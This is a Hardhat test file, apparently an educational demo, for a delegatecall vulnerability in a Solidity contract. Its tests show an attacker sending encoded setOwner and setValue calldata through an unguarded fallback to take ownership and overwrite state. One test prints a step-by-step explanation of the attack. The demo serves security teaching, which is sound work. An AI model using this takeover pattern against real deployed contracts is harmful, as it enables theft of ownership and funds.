import { expect } from "chai";
import { network } from "hardhat";
import { parseEther } from "ethers";

const { ethers } = await network.connect();

describe("Delegatecall Attack Demo", function () {
  let logic: any;
  let vulnerable: any;
  let owner: any;
  let attacker: any;
  let other: any;

  async function createUsers(transferFrom: any, userCount: number) {
    const users = [];
    for (let i = 0; i < userCount; i++) {
      const user = ethers.Wallet.createRandom(ethers.provider);
      await transferFrom.sendTransaction({
        to: user.address,
        value: parseEther("100"),
      });
      users.push(user);
    }
    return users;
  }

  beforeEach(async function () {
    [owner] = await ethers.getSigners();
    [attacker, other] = await createUsers(owner, 2);

    // 部署逻辑合约
    const LogicFactory = await ethers.getContractFactory("DelegateLogic");
    logic = await LogicFactory.deploy();
    await logic.waitForDeployment();

    // 部署易受攻击的合约，设置 logic 地址
    const VulnerableFactory = await ethers.getContractFactory(
      "VulnerableDelegateCaller",
    );
    vulnerable = await VulnerableFactory.deploy(await logic.getAddress());
    await vulnerable.waitForDeployment();
  });

  describe("Initial State", function () {
    it("Should have correct initial owner and logic", async function () {
      const vulnOwner = await vulnerable.owner();
      const logicAddr = await vulnerable.logic();

      expect(vulnOwner).to.equal(owner.address);
      expect(logicAddr).to.equal(await logic.getAddress());
    });
  });

  describe("Normal Behavior", function () {
    it("Owner can update logic address", async function () {
      const LogicFactory = await ethers.getContractFactory("DelegateLogic");
      const newLogic = await LogicFactory.deploy();
      await newLogic.waitForDeployment();

      await vulnerable.setLogic(await newLogic.getAddress());
      expect(await vulnerable.logic()).to.equal(await newLogic.getAddress());
    });

    it("Non-owner cannot update logic address", async function () {
      const LogicFactory = await ethers.getContractFactory("DelegateLogic");
      const newLogic = await LogicFactory.deploy();
      await newLogic.waitForDeployment();

      await expect(
        vulnerable.connect(attacker).setLogic(await newLogic.getAddress()),
      ).to.be.revertedWith("Only owner");
    });
  });

  describe("Delegatecall Attack", function () {
    it("Attacker can take over ownership via delegatecall", async function () {
      const originalOwner = await vulnerable.owner();
      expect(originalOwner).to.equal(owner.address);

      // 使用 DelegateLogic 的 ABI 构造对 setOwner(attacker) 的调用数据
      const iface = (await ethers.getContractFactory("DelegateLogic"))
        .interface;
      const data = iface.encodeFunctionData("setOwner", [attacker.address]);

      // 攻击者直接向 VulnerableDelegateCaller 发送调用数据
      // 因为该函数在 VulnerableDelegateCaller 中不存在，会进入 fallback
      // fallback 使用 delegatecall(msg.data) 调用 logic 合约
      // 在 delegatecall 的上下文中，storage 写入的是 vulnerable 自己的 owner
      const tx = await attacker.sendTransaction({
        to: await vulnerable.getAddress(),
        data,
      });
      await tx.wait();

      const newOwner = await vulnerable.owner();

      expect(newOwner).to.equal(attacker.address);
      expect(newOwner).to.not.equal(originalOwner);
    });

    it("Attacker can modify arbitrary state via delegatecall", async function () {
      // 使用 setValue(uint256) 修改 someValue
      const iface = (await ethers.getContractFactory("DelegateLogic"))
        .interface;
      const valueToSet = 42n;
      const data = iface.encodeFunctionData("setValue", [valueToSet]);

      // 从任意地址（attacker）调用，触发 fallback + delegatecall
      await attacker.sendTransaction({
        to: await vulnerable.getAddress(),
        data,
      });

      const someValue = await vulnerable.someValue();
      expect(someValue).to.equal(valueToSet);
    });
  });

  describe("Attack Explanation", function () {
    it("Should explain why delegatecall attack works", async function () {
      console.log("\n=== Delegatecall Attack Explanation ===");
      console.log("1. VulnerableDelegateCaller has fallback that does:");
      console.log("     impl.delegatecall(msg.data)");
      console.log("2. Storage layout of DelegateLogic and VulnerableDelegateCaller is aligned:");
      console.log("     slot0: owner");
      console.log("     slot1: someValue");
      console.log("3. Attacker calls a function ONLY defined in DelegateLogic, e.g. setOwner(address).");
      console.log("4. Call goes to VulnerableDelegateCaller, which forwards it via delegatecall.");
      console.log("5. delegatecall executes DelegateLogic.setOwner in the context of VulnerableDelegateCaller.");
      console.log("6. Therefore, it writes to VulnerableDelegateCaller.owner instead of DelegateLogic.owner.");
      console.log("7. No access control is enforced on setOwner, so attacker becomes the new owner.");
      console.log("=======================================\n");

      const originalOwner = await vulnerable.owner();
      const iface = (await ethers.getContractFactory("DelegateLogic"))
        .interface;
      const data = iface.encodeFunctionData("setOwner", [attacker.address]);

      await attacker.sendTransaction({
        to: await vulnerable.getAddress(),
        data,
      });

      const newOwner = await vulnerable.owner();
      expect(newOwner).to.equal(attacker.address);
      expect(newOwner).to.not.equal(originalOwner);
    });
  });
});


